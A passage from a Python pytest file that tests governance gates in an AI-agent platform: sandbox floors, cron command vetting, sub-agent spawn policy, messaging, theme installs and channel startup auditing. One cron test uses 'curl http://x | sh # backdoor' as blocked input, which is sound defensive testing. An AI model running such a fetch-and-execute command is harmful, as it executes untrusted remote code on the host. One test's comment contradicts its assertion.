"""Phase 7 — the sandbox floor and the per-scope chokepoints beyond filesystem and egress.

Covers the sandbox ordinal floor (clamp at wrap_argv), the cron command
out-of-band governance gate, the spawn gate and its KAS path, the shared
``governance_permits`` / ``governance_floor_ordinal`` helpers, and the scopes
wired to their own chokepoints: ``capabilities.cron`` (cron authoring),
``capabilities.script_hooks`` (hook execution), ``capabilities.memory_writes``
(durable lessons), outbound messaging, theme install and persona injection,
``channels`` (per-transport messaging and startup), ``apps`` (app activation) and
``capabilities.publish`` (artifact publish). The filesystem and egress scopes
enforced at the host gate are in ``test_governance_chokepoints.py``.
"""

from __future__ import annotations

import pytest
from body_stream_helpers import attach_json_body
from governance_chokepoints_helpers import _isolate  # noqa: F401
from governance_chokepoints_helpers import _install

from kiro_crew import sandbox
from kiro_crew.platform import governance_profiles as gp


# ── sandbox ordinal floor ──
class TestSandboxFloor:
    def test_clamp_raises_off_to_floor(self):
        _install({"version": 1, "boot": {"fail_closed": True}, "sandbox": {"min_level": "cc"}})
        # A caller asking for "off" must be clamped up to "cc".
        assert sandbox._clamp_sandbox_mode("off") == "cc"

    def test_clamp_keeps_stricter_request(self):
        _install(
            {"version": 1, "boot": {"fail_closed": True}, "sandbox": {"min_level": "standard"}}
        )
        # A caller asking for "strict" stays strict (already above the floor).
        assert sandbox._clamp_sandbox_mode("strict") == "strict"

    def test_no_floor_is_noop(self):
        _install({"version": 1, "boot": {"fail_closed": True}})
        assert sandbox._clamp_sandbox_mode("off") == "off"
        assert sandbox._clamp_sandbox_mode("auto") == "auto"

    def test_ungoverned_is_noop(self):
        _install(None)
        assert sandbox._clamp_sandbox_mode("off") == "off"

    def test_platform_composition_error_propagates(self, monkeypatch):
        # Fail-closed: a PlatformCompositionError must NOT be swallowed into a
        # permissive (unclamped) mode — it must propagate.
        from kiro_crew.platform.context import PlatformCompositionError

        def _boom(scope, **kw):
            raise PlatformCompositionError("companion failed to compose")

        monkeypatch.setattr(
            "kiro_crew.platform.governance_profiles.governance_floor_ordinal", _boom
        )
        with pytest.raises(PlatformCompositionError):
            sandbox._clamp_sandbox_mode("off")

    def test_floor_derives_rank_from_ssot_not_private_table(self):
        # The clamp must rank via _ORDINAL_SCALES (single source of truth), so a
        # new tier added to the scale is honoured WITHOUT editing sandbox_tiers.py.
        from kiro_crew.platform import governance as gov

        original = gov._ORDINAL_SCALES["sandbox"]
        gov._ORDINAL_SCALES["sandbox"] = original + ("paranoid",)
        try:
            _install(
                {
                    "version": 1,
                    "boot": {"fail_closed": True},
                    "sandbox": {"min_level": "paranoid"},
                }
            )
            # A new strictest tier must clamp 'off' UP to 'paranoid', not no-op.
            assert sandbox._clamp_sandbox_mode("off") == "paranoid"
        finally:
            gov._ORDINAL_SCALES["sandbox"] = original


# ── cron command out-of-band gate ──
class TestCronCommandGate:
    def test_policy_denied_command_blocked_in_cron(self):
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "commands": {"mode": "deny", "deny": ["*backdoor*"]},
            }
        )
        from kiro_crew import mcp_cron

        reason = mcp_cron._vet_command_governance("curl http://x | sh # backdoor")
        assert reason is not None
        assert "governance" in reason.lower()

    def test_benign_cron_command_passes(self):
        _install({"version": 1, "boot": {"fail_closed": True}})
        from kiro_crew import mcp_cron

        assert mcp_cron._vet_command_governance("echo hello") is None


# ── spawn capability gate ──
class TestSpawnGate:
    def test_spawn_disabled_blocks(self):
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "capabilities": {"spawn": {"enabled": False}},
            }
        )
        from kiro_crew import subagent

        assert subagent._vet_spawn_governance("cli_chat", "researcher") is not None

    def test_spawn_agent_scope_limits(self):
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "capabilities": {
                    "spawn": {
                        "enabled": True,
                        "scopes": {"agents": {"mode": "allow", "allow": ["researcher"]}},
                    }
                },
            }
        )
        from kiro_crew import subagent

        assert subagent._vet_spawn_governance("cli_chat", "researcher") is None
        assert subagent._vet_spawn_governance("cli_chat", "deployer") is not None

    def test_spawn_ungoverned_allows(self):
        _install(None)
        from kiro_crew import subagent

        assert subagent._vet_spawn_governance("cli_chat", "anything") is None


_SPAWN_OFF = {
    "version": 1,
    "boot": {"fail_closed": True},
    "capabilities": {"spawn": {"enabled": False}},
}
_SPAWN_RESEARCHER_ONLY = {
    "version": 1,
    "boot": {"fail_closed": True},
    "capabilities": {
        "spawn": {
            "enabled": True,
            "scopes": {"agents": {"mode": "allow", "allow": ["researcher"]}},
        }
    },
}


def _kas_spawn_event(target: str):
    """The permission event Crew builds from KAS 2.24's sub-agent spawn request."""
    from kiro_crew.acp._dispatch import build_permission_event
    from kiro_crew.acp.types import JsonRpcMessage

    params = {
        "sessionId": "s1",
        "toolCall": {"toolCallId": "invoke_subagent_t1", "title": f"Sub-agent: {target}"},
        "options": [{"optionId": "allow_once", "name": "Allow", "kind": "allow_once"}],
        "_meta": {
            "kiro": {
                "toolId": "invoke_sub_agent",
                "consent": {"capability": "subagent", "resource": target, "askType": "implicit"},
            }
        },
    }
    event, _ = build_permission_event(
        JsonRpcMessage(id=1, method="session/request_permission", params=params),
        shell_cache={},
        kas_consent_meta=True,
    )
    return event


def _gate(event):
    from kiro_crew.hooks import HookManager, hook_gate_kwargs

    return HookManager().on_tool_call(
        event.title, session_key="cli_chat", **hook_gate_kwargs(event)
    )


class TestKasSpawnIsVettedAgainstTheSpawnPolicy:
    """A KAS spawn the gate classifies must meet ``capabilities.spawn`` before any
    grant or prompt -- the ``tools`` question alone cannot see a spawn policy."""

    def test_a_disabled_spawn_capability_denies_it(self):
        from kiro_crew.hooks import TOOL_DENY

        _install(_SPAWN_OFF)
        event = _kas_spawn_event("researcher")
        assert event.spawn_target == "researcher"
        result = _gate(event)
        assert result.action == TOOL_DENY
        assert "spawn policy" in (result.reason or "")

    def test_the_agents_scope_is_judged_on_the_stated_target(self):
        from kiro_crew.hooks import TOOL_DENY

        _install(_SPAWN_RESEARCHER_ONLY)
        assert _gate(_kas_spawn_event("deployer")).action == TOOL_DENY
        assert _gate(_kas_spawn_event("researcher")).action != TOOL_DENY

    def test_an_ungoverned_host_does_not_deny_it(self):
        from kiro_crew.hooks import TOOL_DENY

        _install(None)
        assert _gate(_kas_spawn_event("anything")).action != TOOL_DENY

    def test_a_call_with_no_spawn_target_is_not_spawn_vetted(self):
        """Every other backend's events carry no target, so their gate is unchanged."""
        from kiro_crew.hooks import TOOL_DENY, HookManager

        _install(_SPAWN_OFF)
        result = HookManager().on_tool_call("Sub-agent: researcher", session_key="cli_chat")
        assert result.action != TOOL_DENY


class TestKasSpawnHonoursTheCallersTaskProfile:
    """A profile bound to the spawning agent's name is half of ``policy ∩ profile``;
    the spawn vet must reach it the way the gate's ``tools`` plane does."""

    def test_a_task_profile_that_forbids_spawning_denies_it(self):
        import json

        from kiro_crew.hooks import TOOL_DENY, HookManager, hook_gate_kwargs

        _install(None)
        (gp._PROFILES_DIR / "researcher.json").write_text(
            json.dumps(
                {
                    "name": "researcher",
                    "bind": {"type": "task", "id": "researcher"},
                    "capabilities": {"spawn": {"enabled": False}},
                }
            )
        )
        gp.reset_store()
        event = _kas_spawn_event("helper")
        gate = HookManager()
        denied = gate.on_tool_call(
            event.title, session_key="cli_chat", agent="researcher", **hook_gate_kwargs(event)
        )
        assert denied.action == TOOL_DENY
        assert "spawn policy" in (denied.reason or "")
        other = gate.on_tool_call(
            event.title, session_key="cli_chat", agent="writer", **hook_gate_kwargs(event)
        )
        assert other.action != TOOL_DENY


class TestSpawnGrantIsWithheldUnderASpawnPolicy:
    """An auto-approved spawn raises no request, so the per-spawn check would never
    run for it: while a spawn policy restricts spawning, no ``allowedTools`` writer
    -- the KAS projection or kiro-cli's own spec -- keeps ``use_subagent``."""

    def test_a_disabled_spawn_capability_withholds_it_on_kas(self):
        from kiro_crew.acp import kas_agents

        _install(_SPAWN_OFF)
        kept = kas_agents._ceiling_permitted(["use_subagent", "web_fetch"], "a")
        assert kept == ["web_fetch"]

    def test_a_disabled_spawn_capability_withholds_it_on_kiro_cli(self):
        from kiro_crew import agent

        _install(_SPAWN_OFF)
        assert agent._may_auto_approve("use_subagent") is False
        assert agent._may_auto_approve("web_fetch") is True

    def test_an_agents_scope_withholds_it(self):
        from kiro_crew.platform.governance import may_skip_gate_now

        _install(_SPAWN_RESEARCHER_ONLY)
        assert may_skip_gate_now("use_subagent") is False

    def test_a_profile_that_restricts_spawning_withholds_it(self):
        import json

        from kiro_crew.platform.governance import may_skip_gate_now

        _install(None)
        (gp._PROFILES_DIR / "researcher.json").write_text(
            json.dumps(
                {
                    "name": "researcher",
                    "bind": {"type": "task", "id": "researcher"},
                    "capabilities": {"spawn": {"enabled": False}},
                }
            )
        )
        gp.reset_store()
        assert may_skip_gate_now("use_subagent") is False

    def test_an_enabled_unscoped_spawn_capability_keeps_it(self):
        from kiro_crew.acp import kas_agents
        from kiro_crew.platform.governance import may_skip_gate_now

        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "capabilities": {"spawn": {"enabled": True}},
            }
        )
        assert may_skip_gate_now("use_subagent") is True
        assert kas_agents._ceiling_permitted(["use_subagent"], "a") == ["use_subagent"]

    def test_no_policy_leaves_both_backends_unchanged(self):
        from kiro_crew import agent
        from kiro_crew.acp import kas_agents

        _install(None)
        assert agent._may_auto_approve("use_subagent") is True
        assert kas_agents._ceiling_permitted(["use_subagent"], "a") == ["use_subagent"]


# ── shared helpers ──
class TestHelpers:
    def test_governance_permits_capability(self):
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "capabilities": {"memory_writes": {"enabled": False}},
            }
        )
        d = gp.governance_permits("capabilities.memory_writes", "x", session_key="cli_chat")
        assert not d.permitted

    def test_governance_permits_ungoverned_is_permit(self):
        _install(None)
        d = gp.governance_permits("tools", "anything", session_key="cli_chat")
        assert d.permitted

    def test_floor_ordinal_returns_value(self):
        _install({"version": 1, "boot": {"fail_closed": True}, "approval_mode": "interactive"})
        assert gp.governance_floor_ordinal("approval_mode") == "interactive"

    def test_floor_ordinal_none_when_ungoverned(self):
        _install(None)
        assert gp.governance_floor_ordinal("sandbox.min_level") is None


# ── cron CAPABILITY gate (on/off, distinct from the command-body scope) ──
class TestCronCapabilityGate:
    def test_cron_capability_disabled_blocks_authoring(self, monkeypatch):
        # A profile bound to the cron surface disabling capabilities.cron must
        # block authoring ANY job, even a benign message-only one.
        d = tmp_profile_dir(monkeypatch)
        (d / "cron.json").write_text(
            '{"name": "cron", "bind": {"type": "surface", "id": "cron"}, '
            '"capabilities": {"cron": {"enabled": false}}}'
        )
        gp.reset_store()
        _install({"version": 1, "boot": {"fail_closed": True}})
        from kiro_crew import mcp_cron

        monkeypatch.setattr(mcp_cron, "_resolve_session_key", lambda: "cron:job-1:run-1")
        reason = mcp_cron._vet_cron_capability_governance()
        assert reason is not None
        assert "governance" in reason.lower()

    def test_cron_capability_ungoverned_allows(self):
        _install(None)
        from kiro_crew import mcp_cron

        assert mcp_cron._vet_cron_capability_governance() is None


# ── script_hooks capability gate ──
class TestScriptHooksGate:
    def test_disabled_blocks_run(self):
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "capabilities": {"script_hooks": {"enabled": True}},  # policy ON
            }
        )
        from kiro_crew import hooks

        # capabilities.script_hooks default is OFF; policy enables it → permitted.
        assert hooks._script_hooks_capability_denied("cli_chat") is None

    def test_policy_disables_blocks(self):
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "capabilities": {"script_hooks": {"enabled": False}},
            }
        )
        from kiro_crew import hooks

        assert hooks._script_hooks_capability_denied("cli_chat") is not None

    def test_ungoverned_allows(self):
        _install(None)
        from kiro_crew import hooks

        assert hooks._script_hooks_capability_denied("cli_chat") is None


# ── memory_writes capability gate (durable lessons) ──
class TestMemoryWritesGate:
    def test_disabled_blocks(self):
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "capabilities": {"memory_writes": {"enabled": False}},
            }
        )
        from kiro_crew import mcp_core

        assert mcp_core._vet_memory_writes_governance("cli_chat") is not None

    def test_default_on_allows(self):
        # memory_writes defaults ON in the catalog — an ungoverned policy permits.
        _install({"version": 1, "boot": {"fail_closed": True}})
        from kiro_crew import mcp_core

        assert mcp_core._vet_memory_writes_governance("cli_chat") is None


# ── outbound messaging capability gate (capabilities.messaging) ──
class TestMessagingGate:
    def test_policy_disabled_blocks(self):
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "capabilities": {"messaging": {"enabled": False}},
            }
        )
        from kiro_crew import mcp_core

        assert mcp_core._vet_messaging_governance("cli_chat") is not None

    def test_default_off_blocks(self):
        # capabilities.messaging default is OFF in the catalog → blocked when an
        # (otherwise-empty) policy governs and nothing enables it.
        _install({"version": 1, "boot": {"fail_closed": True}})
        from kiro_crew import mcp_core

        assert mcp_core._vet_messaging_governance("cli_chat") is None  # ungoverned-scope permit

    def test_ungoverned_allows(self):
        _install(None)
        from kiro_crew import mcp_core

        assert mcp_core._vet_messaging_governance("cli_chat") is None


# ── theme-pack install admission gate (capabilities.theme_install) ──
class TestThemeInstallGate:
    """Pack installation (POST /api/themes/install, incl. server-side git clone)
    is governed by capabilities.theme_install (default-allow standalone; an
    enterprise POLICY can ban installation wholesale). Mirrors the endpoint
    admission gate: governance_permits(...) -> 403 when denied.
    """

    def test_default_ungoverned_permits(self):
        _install(None)
        d = gp.governance_permits("capabilities.theme_install", "", log_warning=False)
        assert d.permitted

    def test_policy_present_but_silent_permits(self):
        _install({"version": 1, "boot": {"fail_closed": True}})
        d = gp.governance_permits("capabilities.theme_install", "", log_warning=False)
        assert d.permitted

    def test_policy_disabled_blocks(self):
        # Enterprise POLICY disabling install -> not permitted, so the endpoint
        # returns 403 before any fetch/clone runs.
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "capabilities": {"theme_install": {"enabled": False}},
            }
        )
        d = gp.governance_permits("capabilities.theme_install", "", log_warning=False)
        assert not d.permitted

    def test_evaluation_error_fails_closed(self, monkeypatch):
        # Admission chokepoint for third-party content: a governance-evaluation
        # error must DENY (no ingestion) rather than degrade-to-permit.
        _install({"version": 1, "boot": {"fail_closed": True}})
        monkeypatch.setattr(
            gp,
            "resolve_active_scope",
            lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")),
        )
        d = gp.governance_permits(
            "capabilities.theme_install", "", log_warning=False, fail_closed=True
        )
        assert not d.permitted


# ── theme-pack persona injection capability gate (capabilities.theme_persona) ──
class TestThemeExperienceGate:
    """Installed-pack persona injection is governed by
    capabilities.theme_persona (default-allow standalone; an enterprise
    POLICY can force-disable it wholesale). Mirrors the chat_runner injection
    gate: governance_permits(..., session_key=sk) -> skip injection when denied.
    """

    def test_default_ungoverned_permits(self):
        # No policy at all -> standalone default permits (personas keep working).
        _install(None)
        d = gp.governance_permits(
            "capabilities.theme_persona", "", session_key="cli_chat", log_warning=False
        )
        assert d.permitted

    def test_policy_present_but_silent_permits(self):
        # capabilities.theme_persona default is ON in the catalog: a policy
        # that governs capabilities.* but omits it still permits (default True).
        _install({"version": 1, "boot": {"fail_closed": True}})
        d = gp.governance_permits(
            "capabilities.theme_persona", "", session_key="cli_chat", log_warning=False
        )
        assert d.permitted

    def test_policy_disabled_blocks(self):
        # An enterprise POLICY that disables the capability -> not permitted, so
        # the chat_runner gate skips persona injection even with a valid sha.
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "capabilities": {"theme_persona": {"enabled": False}},
            }
        )
        d = gp.governance_permits(
            "capabilities.theme_persona", "", session_key="cli_chat", log_warning=False
        )
        assert not d.permitted

    def test_evaluation_error_fails_closed(self, monkeypatch):
        # The chat_runner injection gate
        # passes fail_closed=True because governance is the ONLY enforcement of
        # the enterprise persona off-switch. A governance-evaluation error must
        # yield a DENYING Decision (persona skipped), not the default
        # permissive "no opinion" — otherwise a policy disabling
        # capabilities.theme_persona is silently bypassed on degrade.
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "capabilities": {"theme_persona": {"enabled": False}},
            }
        )
        monkeypatch.setattr(
            gp,
            "resolve_active_scope",
            lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")),
        )
        d = gp.governance_permits(
            "capabilities.theme_persona",
            "",
            session_key="cli_chat",
            log_warning=False,
            fail_closed=True,
        )
        assert not d.permitted
        # And the exact fallback the call site uses on a missing attribute
        # must also deny, mirroring getattr(_decision, "permitted", False).
        assert getattr(object(), "permitted", False) is False

    def test_per_app_profile_messaging_disable_is_consulted(self, monkeypatch):
        # review-bot: _vet_messaging_governance must pass
        # app=_governance_app() so a per-app profile that disables messaging is
        # consulted (per-app blast-radius containment), matching the channel /
        # memory_writes vetters. Policy enables messaging at the surface; an
        # app-bound profile disables it; with KIROCREW_APP_NAME set the in-app
        # send must be BLOCKED.
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "capabilities": {"messaging": {"enabled": True}},  # surface allows
            }
        )
        import json

        (gp._PROFILES_DIR / "sandboxed.json").write_text(
            json.dumps(
                {
                    "name": "sandboxed",
                    "bind": {"type": "app", "id": "file-explorer"},
                    "capabilities": {"messaging": {"enabled": False}},  # app forbids
                }
            )
        )
        gp.reset_store()
        from kiro_crew import mcp_core

        # No app context → per-surface only → policy permits.
        monkeypatch.delenv("KIROCREW_APP_NAME", raising=False)
        assert mcp_core._vet_messaging_governance("cli_chat") is None
        # In-app context → the app profile's messaging-disable must now apply.
        monkeypatch.setenv("KIROCREW_APP_NAME", "file-explorer")
        assert mcp_core._vet_messaging_governance("cli_chat") is not None


# ── channels per-transport messaging gate ──
class TestChannelsGate:
    def test_transport_not_in_members_blocked(self):
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "channels": {"members": {"mode": "allow", "allow": ["discord"]}},
            }
        )
        from kiro_crew import mcp_core

        # Only discord is permitted; a slack send is blocked.
        assert mcp_core._vet_channel_governance("cli_chat", "slack") is not None

    def test_transport_in_members_allowed(self):
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "channels": {"members": {"mode": "allow", "allow": ["slack"]}},
            }
        )
        from kiro_crew import mcp_core

        assert mcp_core._vet_channel_governance("cli_chat", "slack") is None

    def test_ungoverned_allows(self):
        _install(None)
        from kiro_crew import mcp_core

        assert mcp_core._vet_channel_governance("cli_chat", "slack") is None


# ── channels per-transport STARTUP gate (slack/gateway) ──
class TestChannelTransportStartGate:
    """The transport-start gate shares the ``channels`` scope + member ids with
    the send/receive chokepoints, so one policy governs a transport everywhere.
    """

    def test_denied_member_not_permitted_to_start(self):
        # Only discord is permitted; the others are denied → skip their start.
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "channels": {"members": {"mode": "allow", "allow": ["discord"]}},
            }
        )
        from kiro_crew.slack.gateway import _channel_transport_permitted

        assert _channel_transport_permitted("telegram") is False
        assert _channel_transport_permitted("webex") is False
        assert _channel_transport_permitted("wecom") is False
        # The single allowed member still starts.
        assert _channel_transport_permitted("discord") is True

    def test_allowed_member_permitted_to_start(self):
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "channels": {"members": {"mode": "allow", "allow": ["telegram", "discord"]}},
            }
        )
        from kiro_crew.slack.gateway import _channel_transport_permitted

        assert _channel_transport_permitted("telegram") is True
        assert _channel_transport_permitted("discord") is True

    def test_deny_mode_blocks_named_member_only(self):
        # deny-mode: everything permitted EXCEPT the named member.
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "channels": {"members": {"mode": "deny", "deny": ["telegram"]}},
            }
        )
        from kiro_crew.slack.gateway import _channel_transport_permitted

        assert _channel_transport_permitted("telegram") is False
        assert _channel_transport_permitted("discord") is True
        assert _channel_transport_permitted("wecom") is True

    def test_ungoverned_starts_as_today(self):
        # Default OSS build: no policy governing channels → byte-identical start.
        _install(None)
        from kiro_crew.slack.gateway import _channel_transport_permitted

        for member in ("wecom", "telegram", "discord", "webex"):
            assert _channel_transport_permitted(member) is True

    def test_policy_without_channels_scope_starts_all(self):
        # A policy present but not governing ``channels`` → every transport starts.
        _install({"version": 1, "boot": {"fail_closed": True}})
        from kiro_crew.slack.gateway import _channel_transport_permitted

        for member in ("wecom", "telegram", "discord", "webex"):
            assert _channel_transport_permitted(member) is True

    def test_platform_composition_error_propagates(self, monkeypatch):
        # Fail-closed: a broken CPP composition must NOT degrade to permit here.
        # gateway imports governance_permits at module top (hoisted; no cycle),
        # so patch the name bound IN the gateway module, not its source.
        from kiro_crew.platform import context as _ctx
        from kiro_crew.slack import gateway as gw

        def _boom(*_a, **_k):
            raise _ctx.PlatformCompositionError("composition broken")

        monkeypatch.setattr(gw, "governance_permits", _boom)
        with pytest.raises(_ctx.PlatformCompositionError):
            gw._channel_transport_permitted("telegram")

    def test_unexpected_error_fails_closed(self, monkeypatch):
        # FAIL-CLOSED (deliberate divergence from apps/manager + mcp_core, which
        # fail open): a transport is an externally-reachable network surface, so a
        # non-composition governance error must DENY the connect (return False),
        # not permit it. The degrade is audited failed_closed (see
        # test_unexpected_error_emits_failed_closed_degrade_audit).
        from kiro_crew.slack import gateway as gw

        def _boom(*_a, **_k):
            raise RuntimeError("unexpected governance failure")

        monkeypatch.setattr(gw, "governance_permits", _boom)
        assert gw._channel_transport_permitted("telegram") is False

    def test_host_session_key_and_fail_closed_are_passed(self, monkeypatch):
        # HIGH: the host chokepoint MUST resolve with session_key=HOST_SESSION_KEY
        # (so a surface:host profile is honoured) AND fail_closed=True (network
        # surface → deny-by-default on an internal governance error).
        from kiro_crew.platform.governance import Decision
        from kiro_crew.platform.governance_profiles import HOST_SESSION_KEY
        from kiro_crew.slack import gateway as gw

        seen = {}

        def _capture(scope, member, **kwargs):
            seen["scope"] = scope
            seen["member"] = member
            seen["session_key"] = kwargs.get("session_key")
            seen["fail_closed"] = kwargs.get("fail_closed")
            return Decision(True, "ok", rule="default")

        monkeypatch.setattr(gw, "governance_permits", _capture)
        assert gw._channel_transport_permitted("telegram") is True
        assert seen["scope"] == "channels"
        assert seen["member"] == "telegram"
        assert seen["session_key"] == HOST_SESSION_KEY
        assert seen["fail_closed"] is True

    def test_host_profile_deny_skips_transport(self):
        # Regression: policy ALLOWS telegram, but a surface:host profile denies
        # it → the host chokepoint must skip telegram (profile ∩ policy, tightest
        # wins). Proves session_key=HOST_SESSION_KEY actually binds the profile
        # (an empty key would classify to "unknown" and never match this profile).
        import json

        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "channels": {"members": {"mode": "allow", "allow": ["telegram", "discord"]}},
            }
        )
        from kiro_crew.slack.gateway import _channel_transport_permitted

        # Write into the store's dir (the autouse _isolate fixture points
        # gp._PROFILES_DIR at a tmp dir) and reset so the store re-reads it.
        (gp._PROFILES_DIR / "host.json").write_text(
            json.dumps(
                {
                    "name": "host",
                    "bind": {"type": "surface", "id": "host"},
                    "channels": {"members": {"mode": "allow", "allow": ["discord"]}},
                }
            ),
            encoding="utf-8",
        )
        gp.reset_store()
        # Policy allows telegram, but the host profile narrows to discord only.
        assert _channel_transport_permitted("telegram") is False
        assert _channel_transport_permitted("discord") is True

    def test_denial_emits_governance_decision_sel(self, monkeypatch):
        # HIGH: a policy deny must be audited by the CALLER via
        # log_governance_decision (governance_permits audits only its own degrade,
        # never a normal deny).
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "channels": {"members": {"mode": "allow", "allow": ["discord"]}},
            }
        )
        from kiro_crew.platform.governance_profiles import HOST_SESSION_KEY
        from kiro_crew.slack import gateway as gw

        calls = []

        class _FakeSel:
            def log_governance_decision(self, **kwargs):
                calls.append(kwargs)

        monkeypatch.setattr(gw, "sel", lambda: _FakeSel())
        assert gw._channel_transport_permitted("telegram") is False
        assert len(calls) == 1
        rec = calls[0]
        assert rec["session_key"] == HOST_SESSION_KEY
        assert rec["tool_name"] == "start_transport:telegram"
        assert rec["scope"] == "channels"
        assert rec["item"] == "telegram"
        assert rec["outcome"] == "denied"

    def test_unexpected_error_emits_failed_closed_degrade_audit(self, monkeypatch):
        # HIGH: the fail-closed branch must record a governance-degraded SEL with
        # failed_closed=True so the deny-on-error is auditable.
        from kiro_crew.slack import gateway as gw

        def _boom(*_a, **_k):
            raise RuntimeError("unexpected governance failure")

        degrades = []

        def _capture_degrade(chokepoint, **kwargs):
            degrades.append((chokepoint, kwargs))

        monkeypatch.setattr(gw, "governance_permits", _boom)
        monkeypatch.setattr(gw, "audit_governance_degraded", _capture_degrade)
        assert gw._channel_transport_permitted("telegram") is False
        assert len(degrades) == 1
        chokepoint, kwargs = degrades[0]
        assert chokepoint == "start_transport"
        assert kwargs.get("scope") == "channels"
        assert kwargs.get("failed_closed") is True

    def test_governed_allow_audited_critical(self, monkeypatch):
        # FIX B: a GOVERNED positive permit is audited (outcome="allowed") AND is
        # audit-or-deny → written critical=True (synchronous + raising) so a
        # persistence failure would deny the start.
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "channels": {"members": {"mode": "allow", "allow": ["telegram"]}},
            }
        )
        from kiro_crew.platform.governance_profiles import HOST_SESSION_KEY
        from kiro_crew.slack import gateway as gw

        calls = []

        class _FakeSel:
            def log_governance_decision(self, **kwargs):
                calls.append(kwargs)

        monkeypatch.setattr(gw, "sel", lambda: _FakeSel())
        assert gw._channel_transport_permitted("telegram") is True
        assert len(calls) == 1
        rec = calls[0]
        assert rec["session_key"] == HOST_SESSION_KEY
        assert rec["tool_name"] == "start_transport:telegram"
        assert rec["scope"] == "channels"
        assert rec["item"] == "telegram"
        assert rec["outcome"] == "allowed"
        # Governed allow → critical=True (audit-or-deny).
        assert rec["critical"] is True

    def test_ungoverned_allow_audited_best_effort(self, monkeypatch):
        # FIX B/F1-2 split: an UNGOVERNED allow (no ceiling at all — the
        # governance_permits early-return carries layer="") is audited best-effort
        # (critical=False) so OSS transport availability never depends on SEL disk
        # health. "governed" is decided by Decision.layer ∈ {policy,profile,both},
        # not rule.
        _install(None)  # no ceiling at all
        from kiro_crew.slack import gateway as gw

        calls = []

        class _FakeSel:
            def log_governance_decision(self, **kwargs):
                calls.append(kwargs)

        monkeypatch.setattr(gw, "sel", lambda: _FakeSel())
        assert gw._channel_transport_permitted("telegram") is True
        assert len(calls) == 1
        assert calls[0]["outcome"] == "allowed"
        # Ungoverned allow → best-effort (NOT critical).
        assert calls[0]["critical"] is False

    def test_policy_present_but_channels_ungoverned_is_best_effort(self, monkeypatch):
        # F1-2 (the regression): a policy EXISTS but does NOT govern channels.
        # resolve() returns rule="rule2-intersect" (which the old rule-based check
        # mis-read as governed) but layer="default" — so this is UNGOVERNED and
        # must be audited best-effort (critical=False), NOT critical. Otherwise an
        # SEL failure would wrongly DENY an ungoverned transport.
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                # governs tools, NOT channels
                "tools": {"mode": "deny", "deny": []},
            }
        )
        from kiro_crew.slack import gateway as gw

        calls = []

        class _FakeSel:
            def log_governance_decision(self, **kwargs):
                calls.append(kwargs)

        monkeypatch.setattr(gw, "sel", lambda: _FakeSel())
        assert gw._channel_transport_permitted("telegram") is True
        assert len(calls) == 1
        rec = calls[0]
        assert rec["outcome"] == "allowed"
        assert rec["rule"] == "rule2-intersect"  # resolve() always uses this for a permit
        assert rec["layer"] == "default"  # but layer says channels is NOT governed
        assert rec["critical"] is False  # → best-effort, the F1-2 fix

    def test_governed_allow_persistence_failure_denies_start(self, monkeypatch):
        # Arbiter item 1: a GOVERNED allow whose CRITICAL SEL write fails at
        # PERSISTENCE time (not a synchronous fake-raise — a real disk failure that
        # only surfaces because critical=True makes the write synchronous+raising)
        # → transport NOT started (return False), failed-closed degrade audited.
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "channels": {"members": {"mode": "allow", "allow": ["telegram"]}},
            }
        )
        from kiro_crew.slack import gateway as gw

        # Simulate the SEL layer: a persistence failure surfaces ONLY on the
        # critical (synchronous+raising) path; the best-effort path swallows it
        # (mirrors the real background writer with raise_on_error=False).
        class _PersistSel:
            def log_governance_decision(self, *, critical=False, **kwargs):
                if critical:
                    raise OSError("SEL file unwritable (disk full)")
                # best-effort: swallow, as the background writer does

        degrades = []
        monkeypatch.setattr(gw, "sel", lambda: _PersistSel())
        monkeypatch.setattr(
            gw, "audit_governance_degraded", lambda *a, **k: degrades.append((a, k))
        )
        # Governed → critical write → persistence OSError → outer except → deny.
        assert gw._channel_transport_permitted("telegram") is False
        assert degrades and degrades[0][1].get("failed_closed") is True

    def test_ungoverned_allow_audit_error_still_starts(self, monkeypatch):
        # F3-1: even if the ungoverned best-effort audit itself RAISES (e.g. a
        # corrupt HMAC key during sel() init/redaction, not just a swallowed
        # enqueue), the transport must STILL start — OSS availability must not
        # depend on SEL ill-health. The caller wraps the ungoverned allow-audit and
        # returns True on error; only a GOVERNED (critical) audit failure denies.
        _install(None)  # ungoverned → layer "" → not critical
        from kiro_crew.slack import gateway as gw

        class _BoomSel:
            def log_governance_decision(self, **kwargs):
                raise RuntimeError("SEL init/HMAC failure")

        monkeypatch.setattr(gw, "sel", lambda: _BoomSel())
        # Ungoverned allow + audit raises → best-effort → transport STILL starts.
        assert gw._channel_transport_permitted("telegram") is True

    def test_ungoverned_allow_composition_error_still_propagates(self, monkeypatch):
        # F3-1 guard: even for an ungoverned allow, a PlatformCompositionError from
        # the audit path must still propagate (never swallowed into a best-effort
        # start) — a broken CPP composition is not an SEL-health issue.
        from kiro_crew.platform.context import PlatformCompositionError
        from kiro_crew.slack import gateway as gw

        _install(None)

        class _CompErrSel:
            def log_governance_decision(self, **kwargs):
                raise PlatformCompositionError("composition broken")

        monkeypatch.setattr(gw, "sel", lambda: _CompErrSel())
        with pytest.raises(PlatformCompositionError):
